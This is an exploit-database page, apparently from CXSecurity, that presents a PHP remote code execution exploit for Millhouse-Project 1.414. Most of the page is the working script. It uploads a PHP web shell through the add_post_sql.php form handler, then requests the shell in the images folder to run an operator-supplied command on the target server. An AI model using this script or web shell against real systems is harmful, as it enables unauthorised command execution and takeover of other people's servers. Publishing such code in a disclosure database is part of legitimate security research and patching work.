---
title: thrsrossi Millhouse-Project 1.414 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2023050059
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-05-25
fetch_date: 2025-10-04T11:36:42.433509
---

# thrsrossi Millhouse-Project 1.414 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **thrsrossi Millhouse-Project 1.414 Remote Code Execution** **2023.05.24**  Credit:  **[Chokri Hammedi](https://cxsecurity.com/author/Chokri%2BHammedi/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

<?php
/\*
Exploit Title: thrsrossi Millhouse-Project 1.414 - Remote Code Execution
Date: 12/05/2023
Exploit Author: Chokri Hammedi
Vendor Homepage: https://github.com/thrsrossi/Millhouse-Project
Software Link: https://github.com/thrsrossi/Millhouse-Project.git
Version: 1.414
Tested on: Debian
CVE: N/A
\*/
$options = getopt('u:c:');
if(!isset($options['u'], $options['c']))
die("\033[1;32m \n Millhouse Remote Code Execution \n Author: Chokri Hammedi
\n \n Usage : php exploit.php -u http://target.org/ -c whoami\n\n
\033[0m\n
\n");
$target = $options['u'];
$command = $options['c'];
$url = $target . '/includes/add\_post\_sql.php';
$post = '------WebKitFormBoundaryzlHN0BEvvaJsDgh8
Content-Disposition: form-data; name="title"
helloworld
------WebKitFormBoundaryzlHN0BEvvaJsDgh8
Content-Disposition: form-data; name="description"
<p>sdsdsds</p>
------WebKitFormBoundaryzlHN0BEvvaJsDgh8
Content-Disposition: form-data; name="files"; filename=""
Content-Type: application/octet-stream
------WebKitFormBoundaryzlHN0BEvvaJsDgh8
Content-Disposition: form-data; name="category"
1
------WebKitFormBoundaryzlHN0BEvvaJsDgh8
Content-Disposition: form-data; name="image"; filename="rose.php"
Content-Type: application/x-php
<?php
$shell = shell\_exec("' . $command . '");
echo $shell;
?>
------WebKitFormBoundaryzlHN0BEvvaJsDgh8--
';
$headers = array(
'Content-Type: multipart/form-data;
boundary=----WebKitFormBoundaryzlHN0BEvvaJsDgh8',
'Cookie: PHPSESSID=rose1337',
);
$ch = curl\_init($url);
curl\_setopt($ch, CURLOPT\_HTTPHEADER, $headers);
curl\_setopt($ch, CURLOPT\_URL, $url);
curl\_setopt($ch, CURLOPT\_POSTFIELDS, $post);
curl\_setopt($ch, CURLOPT\_POST, true);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_HEADER, true);
$response = curl\_exec($ch);
curl\_close($ch);
// execute command
$shell = "{$target}/images/rose.php?cmd=" . urlencode($command);
$ch = curl\_init($shell);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
$exec\_shell = curl\_exec($ch);
curl\_close($ch);
echo "\033[1;32m \n".$exec\_shell . "\033[0m\n \n";
?>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023050059)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top